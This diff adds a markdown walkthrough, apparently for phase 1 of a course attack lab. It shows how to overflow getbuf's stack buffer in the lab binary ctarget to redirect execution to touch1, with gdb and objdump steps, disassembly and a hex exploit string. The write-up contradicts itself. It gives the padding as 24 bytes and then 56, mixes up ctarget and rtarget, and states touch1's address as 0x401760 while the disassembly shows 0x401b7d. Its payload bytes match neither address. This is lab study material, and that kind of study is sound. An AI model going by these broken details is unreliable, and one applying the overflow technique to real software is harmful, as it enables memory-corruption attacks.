@@ -1,0 +1,82 @@
+Phase 1 is the easiest of the 5. What you are trying to do is overflow the stack with the exploit string and change the return address of 
+getbuf function to the address of touch1 function. You are trying to call the function touch1.
+
+run ctarget executable in gdb and set a breakpoint at getbuf
+
+`b getbuf`
+
+Then disasemble the getbuf function
+
+`disas`
+
+Since the buffer size is a run time constant, we need to look at the disasembled code to figure it out.
+
+```
+Dump of assembler code for function getbuf:
+0000000000401b67 <getbuf>:
+  401b67:       48 83 ec 38             sub    $0x38,%rsp
+  401b6b:       48 89 e7                mov    %rsp,%rdi
+  401b6e:       e8 3f 02 00 00          callq  401db2 <Gets>
+  401b73:       b8 01 00 00 00          mov    $0x1,%eax
+  401b78:       48 83 c4 38             add    $0x38,%rsp
+  401b7c:       c3                      retq
+```
+
+If you look at `sub    $0x38,%rsp`, you can see that 56 (0x38) bytes of buffer is allocated for getbuf.
+
+Now you know the buffer size and you need to input 24 bytes of padding followed by the return address of the touch1 address.
+
+To find the address the touch1, you need to get the dissasembled code for ctarget executable.
+
+`objdump -d rtarget > rtarget_dump.txt`
+
+The above command will save the dissasembled code in file rtarget_dump.txt open that file and find the touch1 function.
+
+I found touch1 inside rtarget which looked like
+
+```
+0000000000401b7d <touch1>:
+  401b7d:       48 83 ec 08             sub    $0x8,%rsp
+  401b81:       c7 05 71 39 00 00 01    movl   $0x1,0x3971(%rip)        # 4054fc <vlevel>
+  401b88:       00 00 00
+  401b8b:       48 8d 3d c7 16 00 00    lea    0x16c7(%rip),%rdi        # 403259 <_IO_stdin_used+0x259>
+  401b92:       e8 59 f6 ff ff          callq  4011f0 <puts@plt>
+  401b97:       bf 01 00 00 00          mov    $0x1,%edi
+  401b9c:       e8 15 04 00 00          callq  401fb6 <validate>
+  401ba1:       bf 00 00 00 00          mov    $0x0,%edi
+  401ba6:       e8 c5 f5 ff ff          callq  401170 <exit@plt>
+```
+
+So it's address is at `0x401760`
+
+When you write the bytes, you need to consider the byte order. My system is a little-endian so the bytes go in reverse order.
+
+Finally create a text file named phase1.txt which will look like below
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* the first 56 bytes are just padding */
+7d 1d 40 00 00 00 00 00 /* address of touch1 */
+```
+
+Now you need to take this file and run it through the program hex2raw, which will generate raw exploit strings
+
+`./hex2raw < phase1.txt > raw-phase1.txt`
+
+Finally, you run the raw file
+
+`./ctarget < raw-phase1.txt`
+
+You will get something like below if your solution is right.
+
+```
+Cookie: 0x2d274378 //your cookie will be different
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+```
